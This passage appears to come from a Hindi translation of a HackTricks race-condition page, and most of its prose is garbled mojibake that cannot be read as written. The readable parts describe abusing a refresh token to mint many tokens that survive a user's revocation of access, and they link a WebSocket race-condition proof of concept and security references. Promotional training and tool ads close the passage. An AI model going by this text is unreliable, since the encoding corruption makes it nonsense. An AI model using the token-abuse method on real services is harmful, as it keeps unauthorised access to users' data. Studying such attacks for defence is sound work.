рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк **рдПрдХ рдорд╛рдиреНрдп RT рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХрдИ AT/RT рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ** рдФрд░ **рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд░рджреНрдж рдХрд░ рджреЗрддрд╛ рд╣реИ, рддреЛ рднреА **рдХрдИ RTs рдорд╛рдиреНрдп рд░рд╣реЗрдВрдЧреЗред**

## **RC рд╡реЗрдм рд╕реЙрдХреЗрдЯреНрд╕ рдореЗрдВ**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) рдореЗрдВ рдЖрдк рдПрдХ PoC рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ Java рдореЗрдВ рд╡реЗрдм рд╕реЙрдХреЗрдЯ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ **рд╕рдорд╛рдирд╛рдВрддрд░** рдореЗрдВ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рддрд╛рдХрд┐ **рд╡реЗрдм рд╕реЙрдХреЗрдЯреНрд╕ рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рдВрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

## рд╕рдВрджрд░реНрдн

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред**

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░реЗрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
